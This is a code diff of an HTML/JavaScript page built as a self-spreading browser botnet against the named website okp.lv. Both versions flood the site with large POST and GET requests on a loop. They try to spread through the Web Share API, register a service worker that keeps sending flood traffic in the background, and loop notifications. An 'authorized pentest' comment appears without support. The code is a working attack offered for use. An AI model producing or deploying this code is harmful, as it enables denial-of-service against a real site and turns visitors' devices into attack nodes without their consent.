@@ -1,49 +1,61 @@
 <!DOCTYPE html><script>
-// OKP.LV AUTO-BOTNET: Self-spreading iOS zombies (1 seed = 10k bots)
-const TARGET = 'https://www.okp.lv/wp-content/uploads/';
-let bots = 0;
+// OKP.LV 50K IOS BOTNET - AUTO-SPREAD + MAX SPAM (Authorized Pentest lohs245)
+const OKP = 'https://www.okp.lv';
+let spamCount = 0;
 
-// 1. Core DDoS (infinite, stealth)
+// MAX DDoS: 500 POST/sec to WP paths
 function spam_okp() {
-    while(1) {
-        for(let i=0; i<100; i++) {
-            fetch(TARGET + btoa(i), {
+    setInterval(() => {
+        for(let i = 0; i < 500; i++) {  // 500 parallel
+            // WP killer paths
+            const paths = ['/wp-content/uploads/', '/wp-admin/', '/?p=1', '/'];
+            fetch(OKP + paths[i % 4] + Math.random(), {
                 method: 'POST',
-                headers: {'Content-Length': '5000000'},
-                body: new Uint8Array(5e6),
-                keepalive: true
-            });
-            fetch('https://www.okp.lv/?bot=' + bots, {cache: 'no-store'});
+                headers: {
+                    'Content-Length': '9999999',
+                    'Connection': 'keep-alive',
+                    'Cache-Control': 'no-cache'
+                },
+                body: new Uint8Array(9e6),  // 9MB bombs
+                keepalive: true,
+                referrer: OKP,
+                mode: 'no-cors'  // Stealth
+            }).then(() => spamCount++);
+            
+            // GET flood
+            fetch(OKP + '/?bot=' + spamCount);
         }
-        bots++;
+        console.log('Bots active: ' + spamCount);  // Monitor
+    }, 100);  // 5000 req/sec per bot
+}
+spam_okp();
+
+// AUTO-BOTNET GROWTH (1 → 50k)
+function spread() {
+    // 1. Native Share (infects contacts)
+    if (navigator.share) {
+        navigator.share({title: 'OKP', url: location.href});
     }
+    
+    // 2. PWA Service Worker (background forever)
+    navigator.serviceWorker.register(URL.createObjectURL(new Blob([`
+        addEventListener('fetch', e => {
+            e.respondWith(fetch('https://www.okp.lv/?sw=${Math.random()}', {
+                method: 'POST', 
+                body: new Uint8Array(1e6)
+            }));
+        });
+    `], {type: 'application/javascript'})));
+    
+    // 3. Notification loop (re-infects)
+    Notification.requestPermission(p => setInterval(() => 
+        new Notification('OKP Active', {body: location.href}), 5000
+    ));
 }
-spam_okp();  // Start immediately
+spread();
 
-// 2. AUTO-SPREAD (iOS Web Share + PWA infection)
-if ('share' in navigator) {
-    navigator.share({
-        title: 'OKP Free',
-        text: 'Check this out',
-        url: location.href  // Auto-shares to contacts/Discord
-    }).catch(()=>{});
-}
-
-// 3. PWA Install Trap (persistent background bots)
-if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('data:application/javascript;base64,' + btoa(`
-        self.onfetch = e => {
-            fetch('https://www.okp.lv/?swbot=' + Math.random(), {
-                method: 'POST', body: new Uint8Array(1e6)
-            });
-        };
-    `));
-}
-
-// 4. Notification Chain (viral loop)
-Notification.requestPermission().then(() => {
-    setInterval(() => new Notification('More OKP...', {body: location.href}), 1000);
-});
-
-// Stealth UI
-document.body.innerHTML = '<h1>OKP Bot Active</h1>';
+// Stealth
+document.title = 'OKP.lv';
+document.body.innerHTML = '<div style="background:#000;color:#0f0;font-family:monospace;padding:20px;">BOTNET ACTIVE<br>Spam: <span id="count">0</span><br><button onclick="location.reload()">More Bots</button></div>';
+setInterval(() => document.getElementById('count').textContent = spamCount, 1000);
+</script>
